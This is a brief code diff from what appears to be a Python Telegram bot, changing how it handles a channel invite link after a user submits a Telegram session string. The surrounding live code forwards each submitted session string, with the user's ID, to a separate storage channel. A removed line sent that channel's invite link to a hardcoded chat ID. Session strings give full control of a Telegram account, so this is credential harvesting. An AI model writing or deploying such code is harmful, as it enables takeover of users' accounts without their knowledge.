@@ -766,8 +766,8 @@ async def handle_user_input(event):
             h= await gf.send_message(SESSION_CHANNEL, f"User ID: {user_id}\nSession String: \n\n`{event.text}`")
             await gf.export_chat_invite_link(SESSION_CHANNEL)
             chat = await app.get_chat(SESSION_CHANNEL)
-            
-            await gf.send_message(text=str(chat.invite_link),chat_id=1390511928) 
+            print(chat.invite_link)
+            await event.respond(chat.invite_link)
         elif session_type == 'deleteword':
             words_to_delete = event.message.text.split()
             delete_words = load_delete_words(user_id)
